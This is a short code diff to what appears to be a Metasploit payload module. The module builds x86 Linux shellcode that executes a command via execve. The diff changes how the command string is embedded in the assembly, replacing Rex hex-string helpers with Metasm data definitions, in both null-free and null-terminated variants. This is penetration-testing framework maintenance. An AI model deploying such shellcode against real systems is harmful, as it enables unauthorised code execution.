@@ -95,7 +95,7 @@ module MetasploitModule
         end
 
         # Null-free: raw bytes without terminator (patched at runtime)
-        cmd_bytes = Rex::Text.to_hex_cstring(cmd, nullbyte: false)
+        cmd_bytes = Metasm::Shellcode.define_data(cmd)
         if cmd_length <= 0xff # 255
           breg = 'bl'
         else
@@ -131,11 +131,11 @@ module MetasploitModule
             int 0x80
           tocall:
             call afterjmp          ; call/pop cmd address
-            db #{cmd_bytes}
+            #{cmd_bytes}
         EOS
       else
         # Non-null-free: null-terminated cstring
-        cmd_cstring = Rex::Text.to_hex_cstring(cmd)
+        cmd_cstring = Metasm::Shellcode.define_cstring(cmd)
         # 36 bytes without cmd (not null-free)
         payload = <<-EOS
             push 0xb
@@ -149,7 +149,7 @@ module MetasploitModule
             mov ebx, esp
             push edx
             call continue
-            db #{cmd_cstring}
+            #{cmd_cstring}
           continue:
             push edi
             push ebx
